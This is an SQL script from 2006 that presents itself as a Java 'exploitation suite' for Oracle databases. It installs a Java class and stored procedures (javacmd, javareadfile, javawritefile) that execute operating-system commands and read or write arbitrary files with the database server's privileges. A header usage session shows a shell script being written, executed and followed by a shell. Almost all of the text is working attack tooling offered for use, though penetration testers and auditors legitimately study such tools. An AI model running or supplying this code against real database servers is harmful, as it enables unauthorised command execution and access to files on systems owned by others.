--
-- $Id: raptor_oraexec.sql,v 1.2 2006/11/23 23:40:16 raptor Exp $
--
-- raptor_oraexec.sql - java exploitation suite for oracle
-- Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
--
-- This is an exploitation suite for Oracle written in Java. Use it to
-- read/write files and execute OS commands with the privileges of the
-- RDBMS, if you have the required permissions (DBA role and SYS:java).
--
-- "The Oracle RDBMS could almost be considered as a shell like bash or the
-- Windows Command Prompt; it's not only capable of storing data but can also
-- be used to completely access the file system and run operating system 
-- commands" -- David Litchfield (http://www.databasesecurity.com/)
--
-- Usage example:
-- $ sqlplus "/ as sysdba"
-- [...]
-- SQL> @raptor_oraexec.sql
-- [...]
-- SQL> exec javawritefile('/tmp/mytest', '/bin/ls -l > /tmp/aaa');
-- SQL> exec javawritefile('/tmp/mytest', '/bin/ls -l / > /tmp/bbb');
-- SQL> exec dbms_java.set_output(2000);
-- SQL> set serveroutput on;
-- SQL> exec javareadfile('/tmp/mytest');
-- /bin/ls -l > /tmp/aaa
-- /bin/ls -l / >/tmp/bbb
-- SQL> exec javacmd('/bin/sh /tmp/mytest');
-- SQL> !sh
-- $ ls -rtl /tmp/
-- [...]
-- -rw-r--r--   1 oracle   system        45 Nov 22 12:20 mytest
-- -rw-r--r--   1 oracle   system      1645 Nov 22 12:20 aaa
-- -rw-r--r--   1 oracle   system      8267 Nov 22 12:20 bbb
-- [...]
--

create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
public class oraexec
{
	/*
	 * Command execution module
	 */
	public static void execCommand(String command) throws IOException
	{
		Runtime.getRuntime().exec(command);
	}

	/*
	 * File reading module
	 */
	public static void readFile(String filename) throws IOException
	{
		FileReader f = new FileReader(filename);
		BufferedReader fr = new BufferedReader(f);
		String text = fr.readLine();
		while (text != null) {
			System.out.println(text);
			text = fr.readLine();
		}
		fr.close();
	}

	/*
	 * File writing module
	 */
	public static void writeFile(String filename, String line) throws IOException
	{
		FileWriter f = new FileWriter(filename, true); /* append */
		BufferedWriter fw = new BufferedWriter(f);
		fw.write(line);
		fw.write("\n");
		fw.close();
	}
}
/

-- usage: exec javacmd('command');
create or replace procedure javacmd(p_command varchar2) as
language java           
name 'oraexec.execCommand(java.lang.String)';
/

-- usage: exec dbms_java.set_output(2000);
--        set serveroutput on;
--        exec javareadfile('/path/to/file');
create or replace procedure javareadfile(p_filename in varchar2) as
language java
name 'oraexec.readFile(java.lang.String)';
/

-- usage: exec javawritefile('/path/to/file', 'line to append');
create or replace procedure javawritefile(p_filename in varchar2, p_line in varchar2) as
language java
name 'oraexec.writeFile(java.lang.String, java.lang.String)';
/
